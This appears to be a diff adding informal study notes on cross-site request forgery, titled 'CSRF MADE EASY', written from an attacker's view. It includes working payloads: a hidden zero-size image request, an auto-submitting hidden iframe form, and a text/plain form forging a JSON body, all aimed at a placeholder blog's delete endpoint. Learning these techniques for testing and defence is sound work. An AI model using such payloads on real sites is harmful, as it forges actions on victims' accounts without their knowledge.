@@ -1,0 +1,57 @@
+CSRF MADE EASY:
+
+CSRF is a technique used to perform actions in the website. 
+
+very basic csrf w/ get request (super unlikely to find just an example)
+There are many forms of csrf. for example say a websites uses a get request to initiate some actions. As an attacker we could just grab this url, send it to the victim and clicking it would cause the site to execute this action for the victim. Even if the backend checks for cookies this would likely still work. With a single click the victims account could be compromised via CSRF. 
+
+In this scenario we could also make it so the user does not even know their account as been compromised. For example if we send a link to a site w/ <img src="https://small-min.blog.com/delete?id=3" width="0" height="0" /> in it. Where the src is the target site being exploited for CSRF. 
+
+This attack does also depend on the browser to some degree. For example if the user is logged into the target site at the time this will automatically execute. This happened because requests between say site a and site b will include site a cookies when making the request to site b.
+-----------------------------------
+NORMAL CSRF:
+most of the time we see a form with an action attribute to some endpoint, usually part of an API. We then see the method attribute almost always w/ a value of post. 
+
+Once again if a site has a csrf vuln, we could send a victim a link to our page potentially disguised as another page and have a form on that page that when submitted goes to the endpoint of the site thats vulnerable to csrf, again if the user submits this he would not even know he had been compromised. Taking it a step further we could include the following HTML and JS on our page so the victim would not even have to click anything besides the link to our page: 
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form
+  method="POST"
+  action="https://small-min.blog.com/delete"
+  target="csrf-frame"
+  id="csrf-form"
+>
+  <input type="hidden" name="id" value="3" />
+  <input type="submit" value="submit" />
+</form>
+<script>
+  document.getElementById("csrf-form").submit();
+</script>
+
+note that the params id and 3 are in an input form. 
+
+-----------------------------------------------
+Furthermore, if the application were attacking supports text/plain content type or even application/json we can change our form like this: 
+<form
+  action="https://small-min.blog.com/delete"
+  method="post"
+  enctype="text/plain"
+>
+  <input name='{"id":3, "ignore_me":"' value='test"}' type="hidden" />
+  <input type="submit" value="delete!" />
+</form>
+
+
+The <form> generates the request body according to the rule name=value, so the form above will generate the following request body:
+
+{"id":3, "ignore_me":"=test"}
+
+
+
+
+
+
+
+
+
+
+
